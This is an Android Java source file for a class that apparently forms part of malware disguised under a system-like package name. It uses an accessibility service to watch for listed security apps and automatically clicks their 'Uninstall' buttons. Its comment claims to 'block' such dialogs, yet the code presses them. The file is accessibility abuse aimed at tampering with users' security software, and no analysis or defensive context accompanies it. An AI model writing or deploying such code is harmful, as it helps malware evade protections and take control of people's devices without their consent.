package com.xrc.system.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.xrc.system.core.Constants;

import java.util.List;

public class AccessibilityBlocker {
    private static final String TAG = Constants.TAG + ":Blocker";

    public static void handleEvent(AccessibilityService service, AccessibilityEvent event) {
        if (event == null) return;
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
            // Block security app uninstall dialogs
            for (String secPkg : Constants.SECURITY_APPS) {
                if (pkg.contains(secPkg)) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("Uninstall");
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Blocked uninstall for: " + secPkg);
                        }
                        node.recycle();
                    }
                    break;
                }
            }
            root.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Blocker failed", e);
        }
    }
}
